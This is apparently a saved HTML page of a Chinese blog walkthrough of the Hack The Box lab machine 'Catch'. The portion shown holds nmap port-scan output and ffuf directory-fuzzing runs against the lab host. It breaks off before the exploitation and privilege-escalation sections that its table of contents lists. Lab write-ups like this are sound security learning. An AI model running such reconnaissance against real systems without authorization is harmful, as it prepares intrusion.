@@ -1,0 +1,1171 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="utf-8">
+    
+    
+    
+    
+    <title>Catch - Hackthebox | Lucifiel&#39;s Blog | Lucifiel 技术博客</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Hackthebox">
+    <meta name="description" content="Hackthebox - Catch靶场信息                                                                                                            靶场类型">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Catch - Hackthebox">
+<meta property="og:url" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/index.html">
+<meta property="og:site_name" content="Lucifiel&#39;s Blog">
+<meta property="og:description" content="Hackthebox - Catch靶场信息                                                                                                            靶场类型">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/65260f4c-a8f4-4590-98d3-0cf1c7499d25.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/1a78fc9e-7749-4dc0-be31-1e9428864b39.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/69e43a85-65a9-4113-9afc-9f8940987d18.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/56804c39-c012-4df1-90a7-1bbdaca4477d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/e7bfff2a-25b5-4df6-b1d5-ec6a13a98e2d.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/bc93a10b-b3a3-4e7e-9352-9c5fd13ed739.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/98515bd6-0376-4759-867d-e96c2584c7b8.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/805be4eb-bf6f-43a6-81e3-7ed44cdda94c.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/9ef80eaa-402e-4a74-8020-501117eb15d7.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/1f547117-160c-4b87-ad11-3867a76705fa.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/315e86c7-732c-4c23-acfe-1e3360e4907f.png">
+<meta property="og:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/69151011-17e6-49a2-9f9f-12f2ab7edb88.png">
+<meta property="article:published_time" content="2022-04-06T11:38:36.000Z">
+<meta property="article:modified_time" content="2023-05-20T01:28:46.995Z">
+<meta property="article:author" content="Lucifiel">
+<meta property="article:tag" content="Hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://www.lucifiel.com/2022/04/06/Hackthebox%20-%20Catch/65260f4c-a8f4-4590-98d3-0cf1c7499d25.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Lucifiel&#39;s Blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
+
+<body>
+    <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Lucifiel</h5>
+          <a href="mailto:LucifielHack@qq.com" title="LucifielHack@qq.com" class="mail">LucifielHack@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/LucifielHack" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Catch - Hackthebox</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Catch - Hackthebox</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2022-04-06T11:38:36.000Z" itemprop="datePublished" class="page-time">
+  2022-04-06
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Hackthebox-Catch"><span class="post-toc-number">1.</span> <span class="post-toc-text">Hackthebox - Catch</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场信息"><span class="post-toc-number">2.</span> <span class="post-toc-text">靶场信息</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#靶场类型"><span class="post-toc-number">3.</span> <span class="post-toc-text">靶场类型</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#信息搜集"><span class="post-toc-number">4.</span> <span class="post-toc-text">信息搜集</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#NMAP"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">NMAP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#HTTP"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">HTTP</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#80-端口"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">80 端口</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#5000-端口"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">5000 端口</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#8000-端口"><span class="post-toc-number">4.2.3.</span> <span class="post-toc-text">8000 端口</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#Apk"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">Apk</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#漏洞利用"><span class="post-toc-number">5.</span> <span class="post-toc-text">漏洞利用</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#权限提升"><span class="post-toc-number">6.</span> <span class="post-toc-text">权限提升</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-Hackthebox - Catch"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Catch - Hackthebox</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2022-04-06 19:38:36" datetime="2022-04-06T11:38:36.000Z"  itemprop="datePublished">2022-04-06</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="Hackthebox-Catch"><a href="#Hackthebox-Catch" class="headerlink" title="Hackthebox - Catch"></a>Hackthebox - Catch</h1><h1 id="靶场信息"><a href="#靶场信息" class="headerlink" title="靶场信息"></a>靶场信息</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/65260f4c-a8f4-4590-98d3-0cf1c7499d25.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="靶场类型"><a href="#靶场类型" class="headerlink" title="靶场类型"></a>靶场类型</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/1a78fc9e-7749-4dc0-be31-1e9428864b39.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h2><pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.150
+Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-06 03:34 EDT
+Nmap scan report for 10.10.11.150
+Host is up (0.25s latency).
+Not shown: 65530 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Catch Global Systems
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GenericLines, Help, RTSPRequest: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 200 OK
+|     Content-Type: text/html; charset=UTF-8
+|     Set-Cookie: i_like_gitea=229c01ff2c679664; Path=/; HttpOnly
+|     Set-Cookie: _csrf=VFIu8a5yLSGnb8AWF33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ; Path=/; Expires=Thu, 07 Apr 2022 07:35:24 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Wed, 06 Apr 2022 07:35:24 GMT
+|     &lt;!DOCTYPE html&gt;
+|     &lt;html lang=&quot;en-US&quot; class=&quot;theme-&quot;&gt;
+|     &lt;head data-suburl=&quot;&quot;&gt;
+|     &lt;meta charset=&quot;utf-8&quot;&gt;
+|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
+|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
+|     &lt;title&gt; Catch Repositories &lt;/title&gt;
+|     &lt;link rel=&quot;manifest&quot; href=&quot;data:application/json;base64,eyJuYW1lIjoiQ2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyIsInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz
+|   HTTPOptions: 
+|     HTTP/1.0 405 Method Not Allowed
+|     Set-Cookie: i_like_gitea=ada0631c19902f31; Path=/; HttpOnly
+|     Set-Cookie: _csrf=Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg; Path=/; Expires=Thu, 07 Apr 2022 07:35:33 GMT; HttpOnly; SameSite=Lax
+|     Set-Cookie: macaron_flash=; Path=/; Max-Age=0; HttpOnly
+|     X-Frame-Options: SAMEORIGIN
+|     Date: Wed, 06 Apr 2022 07:35:33 GMT
+|_    Content-Length: 0
+5000/tcp open  upnp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, RTSPRequest, SMBProgNeg, ZendJavaBridge: 
+|     HTTP/1.1 400 Bad Request
+|     Connection: close
+|   GetRequest: 
+|     HTTP/1.1 302 Found
+|     X-Frame-Options: SAMEORIGIN
+|     X-Download-Options: noopen
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Content-Security-Policy: 
+|     X-Content-Security-Policy: 
+|     X-WebKit-CSP: 
+|     X-UA-Compatible: IE=Edge,chrome=1
+|     Location: /login
+|     Vary: Accept, Accept-Encoding
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 28
+|     Set-Cookie: connect.sid=s%3AEQngskGgO4I2xPH7SOxj7INNlQZTOA-7.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw; Path=/; HttpOnly
+|     Date: Wed, 06 Apr 2022 07:35:28 GMT
+|     Connection: close
+|     Found. Redirecting to /login
+|   HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     X-Frame-Options: SAMEORIGIN
+|     X-Download-Options: noopen
+|     X-Content-Type-Options: nosniff
+|     X-XSS-Protection: 1; mode=block
+|     Content-Security-Policy: 
+|     X-Content-Security-Policy: 
+|     X-WebKit-CSP: 
+|     X-UA-Compatible: IE=Edge,chrome=1
+|     Allow: GET,HEAD
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 8
+|     ETag: W/&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg&quot;
+|     Set-Cookie: connect.sid=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy.5H0gXM7aorV%2BeFuutbDUJQn149ThPRcg%2FiKj%2FeVanl0; Path=/; HttpOnly
+|     Vary: Accept-Encoding
+|     Date: Wed, 06 Apr 2022 07:35:31 GMT
+|     Connection: close
+|_    GET,HEAD
+8000/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Catch Global Systems
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port3000-TCP:V=7.91%I=7%D=4/6%Time=624D42BB%P=x86_64-pc-linux-gnu%r(Gen
+SF:ericLines,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
+SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
+SF:0Request&quot;)%r(GetRequest,14F9,&quot;HTTP/1\.0\x20200\x20OK\r\nContent-Type:\x
+SF:20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20i_like_gitea=229c01ff2c
+SF:679664;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=VFIu8a5yLSGnb8AW
+SF:F33ofFOqRKE6MTY0OTIzMDUyNDYwMDczNjU5MQ;\x20Path=/;\x20Expires=Thu,\x200
+SF:7\x20Apr\x202022\x2007:35:24\x20GMT;\x20HttpOnly;\x20SameSite=Lax\r\nSe
+SF:t-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x20HttpOnly\r\nX-
+SF:Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2006\x20Apr\x202022\x200
+SF:7:35:24\x20GMT\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\&quot;en-US\&quot;\x20cl
+SF:ass=\&quot;theme-\&quot;&gt;\n&lt;head\x20data-suburl=\&quot;\&quot;&gt;\n\t&lt;meta\x20charset=\&quot;utf-8
+SF:\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20i
+SF:nitial-scale=1\&quot;&gt;\n\t&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content
+SF:=\&quot;ie=edge\&quot;&gt;\n\t&lt;title&gt;\x20Catch\x20Repositories\x20&lt;/title&gt;\n\t&lt;link\
+SF:x20rel=\&quot;manifest\&quot;\x20href=\&quot;data:application/json;base64,eyJuYW1lIjoi
+SF:Q2F0Y2ggUmVwb3NpdG9yaWVzIiwic2hvcnRfbmFtZSI6IkNhdGNoIFJlcG9zaXRvcmllcyI
+SF:sInN0YXJ0X3VybCI6Imh0dHA6Ly9naXRlYS5jYXRjaC5odGI6MzAwMC8iLCJpY29ucyI6W3
+SF:sic3JjIjoiaHR0cDovL2dpdGVhLmNhdGNoLmh0Yjoz&quot;)%r(Help,67,&quot;HTTP/1\.1\x2040
+SF:0\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\
+SF:nConnection:\x20close\r\n\r\n400\x20Bad\x20Request&quot;)%r(HTTPOptions,17F,
+SF:&quot;HTTP/1\.0\x20405\x20Method\x20Not\x20Allowed\r\nSet-Cookie:\x20i_like_
+SF:gitea=ada0631c19902f31;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=
+SF:Fjvxg_M7Bc_5OS6o7uXWAaUEJCg6MTY0OTIzMDUzMzM1MTAzMTUxNg;\x20Path=/;\x20E
+SF:xpires=Thu,\x2007\x20Apr\x202022\x2007:35:33\x20GMT;\x20HttpOnly;\x20Sa
+SF:meSite=Lax\r\nSet-Cookie:\x20macaron_flash=;\x20Path=/;\x20Max-Age=0;\x
+SF:20HttpOnly\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Wed,\x2006\x20
+SF:Apr\x202022\x2007:35:33\x20GMT\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSP
+SF:Request,67,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5000-TCP:V=7.91%I=7%D=4/6%Time=624D42C0%P=x86_64-pc-linux-gnu%r(Get
+SF:Request,23C,&quot;HTTP/1\.1\x20302\x20Found\r\nX-Frame-Options:\x20SAMEORIGI
+SF:N\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Options:\x20nosnif
+SF:f\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Security-Policy:\
+SF:x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x20\r\nX-UA-Comp
+SF:atible:\x20IE=Edge,chrome=1\r\nLocation:\x20/login\r\nVary:\x20Accept,\
+SF:x20Accept-Encoding\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\n
+SF:Content-Length:\x2028\r\nSet-Cookie:\x20connect\.sid=s%3AEQngskGgO4I2xP
+SF:H7SOxj7INNlQZTOA-7\.bWQDiu%2BFXvDOHdHW15rgWh4N9jvQ7KAvrpzZQrh4Vvw;\x20P
+SF:ath=/;\x20HttpOnly\r\nDate:\x20Wed,\x2006\x20Apr\x202022\x2007:35:28\x2
+SF:0GMT\r\nConnection:\x20close\r\n\r\nFound\.\x20Redirecting\x20to\x20/lo
+SF:gin&quot;)%r(RTSPRequest,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnectio
+SF:n:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,&quot;HTTP/1\.1\x20400\x20Ba
+SF:d\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(SMBProgNeg,2F,&quot;HTTP/1\
+SF:.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(ZendJav
+SF:aBridge,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\
+SF:r\n\r\n&quot;)%r(HTTPOptions,247,&quot;HTTP/1\.1\x20200\x20OK\r\nX-Frame-Options:
+SF:\x20SAMEORIGIN\r\nX-Download-Options:\x20noopen\r\nX-Content-Type-Optio
+SF:ns:\x20nosniff\r\nX-XSS-Protection:\x201;\x20mode=block\r\nContent-Secu
+SF:rity-Policy:\x20\r\nX-Content-Security-Policy:\x20\r\nX-WebKit-CSP:\x20
+SF:\r\nX-UA-Compatible:\x20IE=Edge,chrome=1\r\nAllow:\x20GET,HEAD\r\nConte
+SF:nt-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x208\r\nETag
+SF::\x20W/\&quot;8-ZRAf8oNBS3Bjb/SU2GYZCmbtmXg\&quot;\r\nSet-Cookie:\x20connect\.sid
+SF:=s%3A-1OGMg8iZf45c1yBQ3QmeijWzg-5hyZy\.5H0gXM7aorV%2BeFuutbDUJQn149ThPR
+SF:cg%2FiKj%2FeVanl0;\x20Path=/;\x20HttpOnly\r\nVary:\x20Accept-Encoding\r
+SF:\nDate:\x20Wed,\x2006\x20Apr\x202022\x2007:35:31\x20GMT\r\nConnection:\
+SF:x20close\r\n\r\nGET,HEAD&quot;)%r(RPCCheck,2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Re
+SF:quest\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSStatusRequestTCP,2F,&quot;HTTP/
+SF:1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(Help,
+SF:2F,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;
+SF:);
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.91%E=4%D=4/6%OT=22%CT=1%CU=30269%PV=Y%DS=2%DC=T%G=Y%TM=624D4342
+OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)SEQ(SP=10
+OS:5%GCD=3%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3
+OS:=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=FE88%W2=F
+OS:E88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M505NNSNW
+OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
+OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
+OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
+OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
+OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE (using port 110/tcp)
+HOP RTT       ADDRESS
+1   276.00 ms 10.10.14.1
+2   276.19 ms 10.10.11.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 160.41 seconds
+</code></pre>
+<h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h3 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/69e43a85-65a9-4113-9afc-9f8940987d18.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>访问后发现任何页面，除了下载 apk 以外，都无法点。</p>
+<p>接着我做了一下 fuzz，也并没有东西，先把 apk 文件下载下来吧，同时去看看其他内容</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.150/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.150/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+javascript              [Status: 301, Size: 317, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
+                        [Status: 200, Size: 6163, Words: 855, Lines: 375]
+:: Progress: [20116/20116] :: Job [1/1] :: 112 req/sec :: Duration: [0:02:39] :: Errors: 0 ::
+</code></pre>
+<p>没有内容</p>
+<h3 id="5000-端口"><a href="#5000-端口" class="headerlink" title="5000 端口"></a>5000 端口</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/2022/04/06/Hackthebox%20-%20Catch/56804c39-c012-4df1-90a7-1bbdaca4477d.png" alt title>
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>5000 端口是一个登陆页面，但是似乎没有账号</p>
+<pre><code class="bash">┌──(root💀kali)-[~/Desktop]
+└─# ffuf -u &quot;http://10.10.11.150:5000/FUZZ&quot; -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive &lt;3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.11.150:5000/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+logout                  [Status: 302, Size: 28, Words: 4, Lines: 1]
+media                   [Status: 301, Size: 177, Words: 7, Lines: 11]
+login                   [Status: 200, Size: 2622, Words: 709, Lines: 57]
+files                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+users                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+account                 [Status: 401, Size: 12, Words: 1, Lines: 1]
+Login                   [Status: 200, Size: 2622, Words: 709, Lines: 57]
+Connections             [Status: 401, Size: 12, Words: 1, Lines: 1]
+connections             [Status: 401, Size: 12, Words: 1, Lines: 1]
+Files                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+messages                [Status: 401, Size: 12, Words: 1, Lines: 1]
+Account                 [Status: 401, Size: 12, Words: 1, Lines: 1]
+Media                   [Status: 301, Size: 177, Words: 7, Lines: 11]
+Users                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+FILES                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+Logout                  [Status: 302, Size: 28, Words: 4, Lines: 1]
+Messages                [Status: 401, Size: 12, Words: 1, Lines: 1]
+                        [Status: 302, Size: 28, Words: 4, Lines: 1]
+rooms                   [Status: 401, Size: 12, Words: 1, Lines: 1]
+MEDIA                   [Status: 301, Size: 177, Words: 7, Lines: 11]
+CONNECTIONS             [Status: 401, Size: 12, Words: 1, Lines: 1]
+LOGIN                   [Status: 200, Size: 2627, Words: 709, Lines: 57]
